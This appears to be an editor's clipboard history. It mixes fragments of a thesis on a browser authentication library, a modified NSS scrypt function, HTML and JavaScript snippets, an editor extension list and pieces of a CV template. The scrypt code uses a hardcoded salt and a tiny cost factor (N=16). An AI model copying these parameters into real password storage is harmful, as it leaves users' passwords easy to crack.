1545e945d5c3e7d9fa642d0a57fc8432|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|8|1|v|tex
	     
81884083bbc1c39bd7ff260ca42bc338|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|1|V|tex
	The library will be fetched from either the server itself or from a trusted third party, such as a Content Distribution Network. 
447b7147e84be512208dcc0995d67ebc|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|17|6|v|tex
	item
14b78b79e7429b04b6c4fe646edd00d1|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|17|8|V|tex
	        When a client tries to authenticate with the server, the client's browser will enforce the usage of the chosen authentication scheme. 
7b0356c1870bcca14c6156385cedcf6b|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|39|v|tex
	 our
2e49e2ef7d9eb4065dbfe1269af6718f|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|39|v|tex
	 API
b8a7332a7d47d0a8665d28dc20ff1947|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|39|v|tex
	 calls
7dc22b2c6a992f0232345df41303f5ea|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|329|v|tex
	setting
261e5f7970422a2e8f9038deff889009|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|259|v|tex
	and other authentication options
2282de8bc4e982fd882383953cb5271f|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|260|v|tex
	 such as 
b96571847534721908535468cfef1768|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|260|v|tex
	 such as minimum password length
31158a6c9fc146a2c7ebae3d7e10700a|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|4|30|v|javascript
	scrypt_seed_ed25519_keypair
38bd55bc3b6f4db1f8b3dc0231afbb77|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|11|v|tex
	The web programmer will use the 
43b03238dffbd4586d9de9fc873f2362|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|86|v|tex
	their own 
b7f64dd5229d651ba06bf8511755b417|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|15|15|v|tex
	w programmer
982543e0b764d7a1537403787dc9a426|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|15|53|v|tex
	 their
ab54cc1a78518af845985091b03aa53a|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|15|53|v|tex
	 server
53b768f9124cc17802c9a6ef3b542c50|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|11|v|tex
	 server should first use the 
7da4de279e574cc9d864832879b3f037|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|154|v|tex
	to enforce the library to use the authentication scheme of their choice
4678e8aa08c6d5c5f254780cdc7a08c7|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|186|v|tex
	choose its desired authentication options
c39d92850654d8ba144c08364eb87913|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|17|5|V|tex
	    \item 
2824f4c0815a83351e681a066e92f96e|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|24|1|V|tex
	\newline
0e1bf15b2a490782f0638c57f1a5931b|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|25|5|V|tex
	    test
1057d7c669cc286d261b9e46d1f9db23|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|2|1|V|javascript
	  initializeCredentialType({
	    passwordMinLength: 4,
	    passwordProccessMethod: "scrypt_seed_ed25519_keypair"
	  });
767c057393e3582e42c4334763309b9c|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|33|3|V|tex
	  ...
d018333adf5c723f39876b289abe3d33|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|26|2|V|tex
	  /* Get username and password from html form */ 
	  ...
bcf747724288bddb37867d0d01863395|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|26|1|V|tex
	myjs.js
a5aac2b487fc8f3a3276c5a9adb73cbc|file:///home/neo/Documents/diplomatiki/javascript-files/myjs.js|17|1|V|javascript
	    signup(username, password, "http://localhost:80/index.php");
204a9e0c47a0feaf1a81f3f1cb7e7208|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|34|1|V|tex
	  ...
	  /* On signup action */
	  ...
2ed8339845db53f2aeb7906428dd5860|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|37|31|v|tex
	 "http://localhost:80/index.php"
24b0e2c5ab447816d11c04fe32133c37|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|37|1|V|tex
	    signup(username, password, serverAddress);
651297cb4a12aec8bb3f6ee74f020a43|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|41|6|v|tex
	ignup
7b0c5abffc76b8fa9fd370dd959235e3|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|26|1|V|tex
	\begin{lstlisting}[caption={Server's  javascript file}]
de9b9ed78d7e2e1dceeffee780e2f919|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|26|38|v|tex
	javascript
6392e93193b5125a379b81d37430bac4|file:///home/neo/Documents/diplomatiki/javascript-files/form.html|2|1|V|html
	<html>
	<head>
	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
	<meta content="utf-8" http-equiv="encoding">
	<link rel="stylesheet" type="text/css" href="demo.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script type = "text/javascript" src = "auth.js"></script>
	<script type = "text/javascript" src = "myjs.js"></script>
	</head>
facf31e0c3fb91405ba8910790750499|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|29|1|V|tex
	<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
06ca1677bcd406b47941491f6cc94439|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|29|1|V|tex
	<meta content="utf-8" http-equiv="encoding">
8beffe76df64349a85aff25bcdb6bc2e|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|29|1|V|tex
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
99f78c54130e752954404fff0707dcbd|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|20|v|tex
	included
1b5f1783bf6acb2e81ad20c0cb565507|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|20|v|tex
	 the
00ef6b2c70c06b3e40c3d905a99e4620|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|20|v|tex
	 web
6ca6bef5de48a1727ba5881749f21bde|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|20|v|tex
	 application
40c06861f80d132b6b25a8fdda5176a0|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|20|v|tex
	 either
02dcf07e612efab4ae8d77daf5072fdc|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|68|v|tex
	hosting
3e85a70400506c6c58d679f750be9f88|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|81|v|tex
	 from
1a5d779fc927bc51a8d56fbb89e57c4c|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|18|123|v|tex
	 own
48bfbaa5e87eea3c39bc6e61ce1d1e68|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|18|123|v|tex
	 Javascript
f5fd7cd3a2d987c9c1317f6c87b2427c|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|18|123|v|tex
	 source
f4a6c5cc5e7c0e194f838800fb99571b|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|18|122|v|tex
	 Javascript file that the client will receive from the web server
4a1845c4ab82442dc7ccf45f129ed367|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|3|39|v|tex
	NSS cryptographic library
00be17a93e30d51fbbd73a2f4617cb66|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|1|v|tex
	We provide a Javascript library called 
a321ff38c23ae2ba9f6c3dc4e75676d6|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|1|V|tex
	{\tt auth.js} that provides simple API calls for the programmer that wishes to use advanced authentication techniques in their web application, without needing to worry about the underlying implementation.
21582c6c30be1217322cdb9aebaf4a59|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|7|15|v|tex
	that
d26ceaebe7d12195f57d51d1c3a1ee54|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|3|278|v|tex
	t use {\tt auth.js} to perform client authentication using 
9aa1b03934893d7134a660af4204f2a9|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|29|v|tex
	Server
763f7f1aec350cd1a46238d1d5c3c229|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|3|31|v|tex
	Firefox
9366282e11c151558bdfaab4a264aa1b|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|2|229|v|tex
	usage
b6fa15360b4cdce4806bf9a0580c8f0f|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|4|330|v|tex
	implementation
d4426a175763023049f3661d88b43fe2|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|811|1|V|c
	void
	SCRYPT_End(SCRYPTContext *ctx, unsigned char *digest,
	           unsigned int *digestLen, unsigned int maxDigestLen)
	{
	
	    size_t passwdlen = strlen(B);
	    const uint8_t * salt = (uint8_t *) "SodiumChloride";
	    size_t saltlen = strlen(salt);
	    uint64_t N = 16;
	    uint32_t _r = 8;
	    uint32_t _p = 1;
	    /* uint8_t buf[64]; */
	    /* bzero(buf,64); */
	
	    if (smix_func == NULL)
	        selectsmix();
	
	    _crypto_scrypt(B, passwdlen, salt, saltlen, N, _r, _p,
	                           digest, 64, smix_func);
	}
9f8b1d5cd10de8057c6cf1e2b42bd6fe|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|5|32|v|tex
	sha512.c in Mozilla's NSS implementation
cab8111fd0b710a336c898e539090e34|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|811|1|V|c
	void
aad44041d839c1544e67666baa09a001|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|12|1|V|tex
	    size_t passwdlen = strlen(B);
	    const uint8_t * salt = (uint8_t *) "SodiumChloride";
	    size_t saltlen = strlen(salt);
	    uint64_t N = 16;
	    uint32_t _r = 8;
	    uint32_t _p = 1;
	    /* uint8_t buf[64]; */
	    /* bzero(buf,64); */
	
	    if (smix_func == NULL)
	        selectsmix();
620f621c25f4839b53486bb8549df5d9|file:///media/neo/Storage/mozilla-central/security/nss/lib/freebl/sha512.c|440|1|V|c
	void
	SHA256_End(SHA256Context *ctx, unsigned char *digest,
	           unsigned int *digestLen, unsigned int maxDigestLen)
	{
	    unsigned int inBuf = ctx->sizeLo & 0x3f;
	    unsigned int padLen = (inBuf < 56) ? (56 - inBuf) : (56 + 64 - inBuf);
05e5d1f151a06a51d34320d430b08424|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|5|20|v|tex
	label={sha512.c}
f09dc39ec7b778ff854c7899983370dd|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|6|1|V|tex
	\dlabel{lst:sha512.c}
53b9e9679a8ea25880376080b76f98ad|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|34|132|v|tex
	call
cc5daf26edcf4540ef4306619d42ee4c|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|14|31|v|tex
	task1
a1a9d614cc371f0a166f74988c279c1a|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|14|31|v|tex
	/start_cracking.png
627a362853a2d00a6b74df04e86d1b1f|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|15|12|v|tex
	OphCrack will start trying to crack the password
81e2a31cb8b219542ea473ca25fc0dd7|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|16|10|v|tex
	fig:oph_crack
1bfbcce75c3c9a52a464d4cb0984488a|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|3|13|v|tex
	Traditional
9b732bf885312a3d2420d32d1ec2fa96|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|4|58|v|tex
	traditional
1a86493fd40f54214c8481d8228993e9|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|15|v|tex
	tries
ee11cbb19052e40b07aac0ca060c23ee|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|10|v|tex
	user
04d2657f8100786d25276253a827da85|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|102|v|tex
	he again sends his password to the server
567904efe9e64d9faf3e41ef402cb568|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|145|v|tex
	where
960b44c579bc2f6818d2daaf9e4c16f0|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|3|13|v|tex
	Normal
a0cdea0d3669f117c0a39802061167c3|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|8|1|V|javascript
	  const encoder = new TextEncoder();
	  //Get scrypt hash of password
	  const passEnc = encoder.encode(password);
	  const hashScrypt = await crypto.subtle.digest("SCRYPT", passEnc);
	  const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
9eaf7d95104a6500a0b796932ade0b2d|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|42|1|V|tex
	const hashArrayScrypt = Array.from(new Uint8Array(hashScrypt)); // convert buffer to byte array
2b0513850fa1e5c7ebc853f2df6af7ca|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|41|20|v|tex
	await
c46906acdb77622d444bc3d8ef65784c|list:/extensions|14|1|V|list
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
88b02d56f193ace159d9dc20f5234733|list:/extensions|5|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
	+ coc-sh	0.4.0	~/.config/coc/extensions/node_modules/coc-sh
	+ coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
6e0dfceb5339e20425790a36d9afdeab|list:/extensions|2|1|V|list
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
	* coc-lists	1.3.7	~/.config/coc/extensions/node_modules/coc-lists
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
efc0b212522e98f9206705ae0016531b|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|232|v|tex
	allows 
e3eb16afdbabab150c5da0ade825a14d|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|232|v|tex
	the 
0cf56cc417f00cac8cc6fed0b807ba75|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|232|v|tex
	server 
e15bc80b3b209d36e79a4a1485e17fb2|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|232|v|tex
	pass 
93da65a9fd0004d9477aeac024e08e15|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|294|v|tex
	options
1aec9c5d0644e11fd9dd0f9fb36009fb|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|23|64|v|tex
	used
a24badb66c4d7870fd211f2511461fff|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|23|64|v|tex
	utilized
3110f6e9bb6aa7767751b36d1b75fb0a|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|266|v|tex
	 client
f73c1a94252d71be40b95780e7140621|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|267|v|tex
	client's browser will enforce the usage of the chosen authentication scheme
f0019048a61df0bc0483eab4e00d4419|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|189|v|tex
	When a client tries to authenticate with the server
8103a42390b5e7ebf6477966fb1d300e|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|219|v|tex
	our 
93bd64645e7e760199771835240f44d7|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|219|v|tex
	library 
4c10aa2808de5c157da8d28bc3e43257|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|219|v|tex
	will 
42b121526c6c9957507c64beb9164870|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|9|384|v|tex
	log 
9f82c4a2716ed5e197ea291a8f1baeb0|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|1350|v|tex
	hentication 
3346932c04529ed36b798974242e808e|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|1347|v|tex
	autand
f8e9ae49164ccfb7c2694d3d47a34490|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|27|1348|v|tex
	registration 
80919be0413cba91ea1c240ca12ee13a|file:///home/neo/Documents/diplomatiki/auth.js/architecture.tex|41|4|v|tex
	Signup
b07f12e50239a88eaa63f307282239a2|file:///home/neo/Documents/diplomatiki/auth-webapp/.git/config|7|38|v|gitconfig
	javascript-files
4c0b5c402608d5e41a77ab007e170ed1|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|24|20|v|tex
	B, passwdlen, salt, saltlen, N, _r, _p,
42bcee9f9c8514336f8cf68dfa16b7e9|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|24|20|v|tex
	 digest, 64, smix_func
8f1b7dbbb54d3c73798675e6469736c3|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|24|19|v|tex
	(...);
ddba433899a6ff29d02d3407c7260767|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|24|21|v|tex
	ldots
b5cd1f00c6791b77e358231afd1ec35d|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|17|v|tex
	wishes
486b6680fbf57d3d40ccd5b7612c03fc|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|61|v|tex
	prompts 
f91740c576d8a80ed879f2964f653bb0|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|61|v|tex
	user 
2b32bff1d704091eed7a20022e603c2e|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|8|105|v|tex
	sends 
62fd3f87581663e4371e40eb51d66e76|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|15|203|v|tex
	for 
d894ddae3c17b40b4fe7e16519f950f0|file:///home/neo/Documents/diplomatiki/auth.js/background.tex|15|203|v|tex
	client 
181900dad960beccb34f53c4e0ff4647|file:///home/neo/Documents/resume/cv.tex|8|8|v|tex
	Computer
86327efab50d017ada5fb1602363294d|file:///home/neo/Documents/resume/cv.tex|8|8|v|tex
	Computer Science Bachelor, University of Cyprus
bc93c1cb8f8b777e8fc0da50ac66e2d2|file:///home/neo/Documents/resume/cv.tex|10|1|v|tex
	Grade Point Average: 9.22/10
b6ad303aefad58b607b6a639079d680e|file:///home/neo/Documents/resume/cv.tex|14|1|V|tex
	\newfontfamily\cfont{Noto Sans CJK SC}
6c72a26356d14da676b50951f71c4d07|file:///home/neo/Documents/resume/cv.tex|17|1|V|tex
	% Bold contents of a link
	\let\oldhref\href
	\renewcommand{\href}[3][blue]{\oldhref{#2}{\color{#1}{#3}}}
	
2045ef19766e229efbefe5465877b798|file:///home/neo/Documents/resume/cv.tex|18|9|v|tex
	Luke Smith
20c828d86ec41ac9273d063bb34b92ad|file:///home/neo/Documents/resume/cv.tex|19|1|V|tex
	
	% Update date set to last compile:
	\date{\today}
d4d171dd51e602f42d80cb959b1347fb|file:///home/neo/Documents/resume/cv.tex|28|1|V|tex
	\hfill{}Download this document:
85aaaed4b6551f4218abcf18efbfd711|file:///home/neo/Documents/resume/cv.tex|28|1|V|tex
	\hfill{}\href[gray]{https://LukeSmith.xyz/cv.pdf}{https://LukeSmith.xyz/cv.pdf \pdf}
5f64e25d66dda7b3e2ed4a0f81bedf9d|file:///home/neo/Documents/resume/cv.tex|28|1|V|tex
	\hfill{}(Last updated \thedate.)
9d28bd90d05dcf42ef97000a2668057b|file:///home/neo/Documents/resume/cv.tex|27|1|V|tex
	{\footnotesize\hfill{}\color{gray} }
		\end{minipage}
	}
5bc43352aeb5c2ac35d6806b9a740daa|file:///home/neo/Documents/resume/cv.tex|26|2|V|tex
		\begin{minipage}[t]{.25\textwidth}
14a0af509a39dd1b10af1bd63f58553b|file:///home/neo/Documents/resume/cv.tex|58|1|V|tex
	% Some macros because I'm lazy:
	\newcommand{\uga}{University of Georgia}
	\newcommand{\gsu}{Georgia State University}
	\newcommand{\ua}{University of Arizona}
90f802fa1c4a620a17a803cc9c0cfd4f|file:///home/neo/Documents/resume/cv.tex|59|1|V|tex
	% Macros for people's names including link to their websites
	\newcommand{\tgb}{\href{http://coglanglab.com}{Tom Bever}}
	\newcommand{\mas}{\href{http://dingo.sbs.arizona.edu/~massimo/}{Massimo Piattelli-Palmarini}}
	\newcommand{\rob}{\href{https://rhenderson.net/}{Robert Henderson}}
	\newcommand{\mike}{\href{http://www.u.arizona.edu/~hammond/}{Mike Hammond}}
	\newcommand{\simin}{\href{http://www.u.arizona.edu/~karimi/}{Simin Karimi}}
	\newcommand{\heidi}{\href{http://heidiharley.com/}{Heidi Harley}}
	\newcommand{\amy}{\href{https://linguistics.arizona.edu/user/amy-fountain}{Amy Fountain}}
	\newcommand{\vera}{\href{https://www.gsstudies.uga.edu/people/vera-lee-schoenfeld}{Vera Lee-Schoenfeld}}
	\newcommand{\tim}{\href{http://www.rom.uga.edu/directory/timothy-gupton}{Tim Gupton}}
	\newcommand{\pilar}{\href{http://www.rom.uga.edu/directory/pilar-chamorro}{Pilar Chamorro}}
	\newcommand{\jenni}{\href{https://www.jennimariapalomaki.com/}{Jennimaria Palom√§ki}}
	
bc69ba7327d4e96c9362644010eb2868|file:///home/neo/Documents/resume/cv.tex|60|1|V|tex
	% Link images
	\newcommand{\pdf}{\includegraphics[height=.85em]{cv/pdf.png}}
	\newcommand{\yt}{\includegraphics[height=.85em]{cv/yt.png}}
	\newcommand{\gh}{\includegraphics[height=.85em]{cv/gh.png}}
	\newcommand{\www}{\includegraphics[height=.85em]{cv/www.png}}
	\newcommand{\email}{\includegraphics[height=.85em]{cv/email.png}}
2692d489b86a6c00178e5dee9724e035|file:///home/neo/Documents/resume/cv.tex|79|1|V|tex
		\email{} :     & \href{mailto:luke@lukesmith.xyz}{luke@lukesmith.xyz}\\
		\www{} : &\href{https://www.lukesmith.xyz}{https://lukesmith.xyz}
434ecb7ba9cfa38297194f3d3050164e|file:///home/neo/Documents/resume/cv.tex|82|1|V|tex
	\begin{tabular}{rl}
		\gh{} : & \href{http://github.com/LukeSmithxyz}{github.com/LukeSmithxyz}\\
		\yt{} : &\href{http://youtube.com/c/LukeSmithxyz}{youtube.com/c/LukeSmithxyz}
	\end{tabular}
863f97776b7051b6ca02fbec94f51714|file:///home/neo/Documents/resume/cv.tex|83|1|V|tex
		\gh{} : & \href{http://github.com/LukeSmithxyz}{github.com/LukeSmithxyz}\\
		\yt{} : &\href{http://youtube.com/c/LukeSmithxyz}{youtube.com/c/LukeSmithxyz}
24479bf03f3b0b4f86b97ee79d2c17e8|file:///home/neo/Documents/resume/cv.tex|88|1|V|tex
	\item Doctoral student in linguistics at the \href{https://linguistics.arizona.edu}{University of Arizona \www}, focusing mostly on deriving linguistic traits and tendencies from non-linguistic externals and theoretical reform.
	
	For more information, go here: \href{https://lukesmith.xyz/linguistics}{https://lukesmith.xyz/linguistics \www}.
	\item Since late 2016, I run a \href{https://youtube.com/c/lukesmithxyz}{YouTube channel \yt} mostly on technology tutorials and Linux configuration and system management.
4226ea711061d9acff217a747f5a0824|file:///home/neo/Documents/resume/cv.tex|87|75|v|tex
	\href{https://larbs.xyz}{https://larbs.xyz \www}.
851f833d4c0af1414564c9b72c9dc170|file:///home/neo/Documents/resume/cv.tex|95|68|v|tex
	 Advisors: \tgb, \mike.
39773f7923a78561c11bdb82cbd5fe8c|file:///home/neo/Documents/resume/cv.tex|97|1|V|tex
	\entry{2013--2015}
		{M.A. in Linguistics}
		{\uga, Athens, Georgia}
		{Major in Syntax; minor in \textbf{Romance Languages}. Thesis: \textit{External Possession and the Undisentanglability of Syntax and Semantics} \href{https://lukesmith.xyz/thesis.pdf}{\pdf}. Advisor: \vera.}
	
	\entry{2012}
		{Exchange Program, Zh√®ngzh≈çu University (\cfont{ÈÉëÂ∑ûÂ§ßÂ≠¶})}
		{Zh√®ngzh≈çu, China}
		{Studying Chinese history.}
d9e03ae5510aab578a2a577a9bec075e|file:///home/neo/Documents/resume/cv.tex|97|1|V|tex
	
	\entry{2009--2012}
		{B.A. in International Economics and Modern Languages}
		{Andrew Young School of Policy Studies, \gsu, Atlanta}
		{Specializations in Spanish and Chinese. Certificates in Economic History and International Trade.}
4170434ab2845327ad8ba05f7e94261d|file:///home/neo/Documents/resume/cv.tex|102|1|V|tex
	\item I upload all of my teaching evaluations to \href{https://lukesmith.xyz/classes\#evals}{https://lukesmith.xyz/classes\#evals \www} and they can be read there.
47d3390c793f798b50cf174b65061e00|file:///home/neo/Documents/resume/cv.tex|100|16|v|tex
	 \href{mailto:luke@lukesmith.xyz}{\email} with your interests in me and I'll refer you to someone who can vouch for me or defame me, depending on what you want.
9d740863f5c80d10dc3375c329316cf7|file:///home/neo/Documents/resume/cv.tex|94|2|V|tex
		{\ua, Tucson}
0110d7ffca7b20bdfa00e2bc0af5b83e|file:///home/neo/Documents/resume/cv.tex|74|1|V|tex
	\section{Basic Info}
	
	\begin{minipage}[t]{.5\linewidth}
	\begin{tabular}{rp{.75\linewidth}}
		\baselineskip=20pt
	\end{tabular}
	\end{minipage}
	\begin{minipage}[t]{.5\linewidth}
	\begin{tabular}{rl}
	\end{tabular}
	\end{minipage}
	
	\begin{itemize}
	\item Maintainer and developer of an Arch Linux-based metadistribution at. 
	\end{itemize}
2c9d34dfdbf4e3351e9adce7b6ece9ab|file:///home/neo/Documents/resume/cv.tex|74|10|v|tex
	Institutions
7c02849a9ee8a3e35da65f838de4336f|file:///home/neo/Documents/resume/cv.tex|76|8|v|tex
	2015--2018
c26397a23b4dedcfd39686e3aa43f276|file:///home/neo/Documents/resume/cv.tex|77|3|v|tex
	Ph.D. in Linguistics
e9789d982d096f23d2b6581862149519|file:///home/neo/Documents/resume/cv.tex|78|3|v|tex
	Focusing on biolinguistics, syntax and human language technology.
7faaba1b6627774f91312a9cac935366|file:///home/neo/Documents/resume/cv.tex|76|1|V|tex
	\entry{Sep 2016 -- Present}
		{Computer Science Bachelor, University of Cyprus}
		{Grade Point Average: 9.23/10}
ca92cca3c3e74fcbe5415621dc5aa5a0|file:///home/neo/Documents/resume/cv.tex|80|8|v|tex
	Sep 2016 -- Present
aa70bf9664a051cb4a8c093da620a28a|file:///home/neo/Documents/resume/cv.tex|82|3|v|tex
	Grade Point Average: 9.23/10
6b4fb1938a8be7cf3cfe7a99f915912a|file:///home/neo/Documents/resume/cv.tex|74|1|V|tex
	\section{Education}
	
	\entry{Sep 2016 -- Present}
		{Computer Science Bachelor, University of Cyprus}
		{Grade Point Average: 9.23/10}
	
	\entry{Sep 2011 - Jun 2014}
		{Kykkos B Lyceum ‚Äì High School Diploma}
		{Graduation Grade: 19.73/20}
de7a22a0c94aa64ba2449e520aa20c99|file:///home/neo/Documents/resume/cv.tex|84|10|v|tex
	Education
dd058df87f5c88e3285a28ad7406a3c6|file:///home/neo/Documents/resume/cv.tex|86|20|v|tex
	Present
cfd038545f201956e204a4f0ed0c1705|file:///home/neo/Documents/resume/cv.tex|86|8|v|tex
	Sep 2016 -- 
fcdddfa0ce47c507c9f466514440d9d9|file:///home/neo/Documents/resume/cv.tex|41|10|^v|tex
	\textit{#3} 
5a79c2b4cd3b33298ba2c4299c0072c0|file:///home/neo/Documents/resume/cv.tex|41|22|v|tex
	\footnotesize
7eda7cdcaa7fdce8abf3f921bfff4401|file:///home/neo/Documents/resume/cv.tex|86|1|V|tex
	\entry{June - July 2019}
		{Research Assistant Internship}
	    {Texas A\&M University}
	    {\begin{itemize}
	        \item Worked under the supervision of professor Chia-Che Chai, along with professors Abdullah Muzahid and Eun Jung Kim
	        \item Part of the research team writing ReViCe: Reusing Victim Cache to Prevent Speculative Cache Leakage, currently under submission for ISCA
	\end{itemize}}
